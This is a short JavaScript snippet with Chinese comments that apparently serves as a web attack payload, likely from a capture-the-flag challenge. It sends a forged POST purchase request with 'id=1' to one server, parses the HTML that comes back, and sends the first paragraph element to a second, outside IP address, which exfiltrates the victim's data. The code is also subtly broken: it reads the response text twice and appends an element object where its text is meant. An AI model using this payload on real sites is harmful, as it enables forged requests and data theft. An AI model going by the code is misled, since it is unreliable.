const fetchOptions = {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: "id=1"
};

fetch('http://106.15.207.13:30391/buy', fetchOptions).then(response => response.text())
  .then(response => {
    // 将返回的HTML响应转换为文本
    return response.text();
  })
  .then(htmlText => {
    // 使用DOM解析器将文本转换为DOM对象
    const parser = new DOMParser();
    const htmlDoc = parser.parseFromString(htmlText, 'text/html');

    // 使用DOM操作方法选择并提取特定标签的内容
    const titleElement = htmlDoc.querySelector('p');

    fetch("//122.51.117.66/"+titleElement)
  })
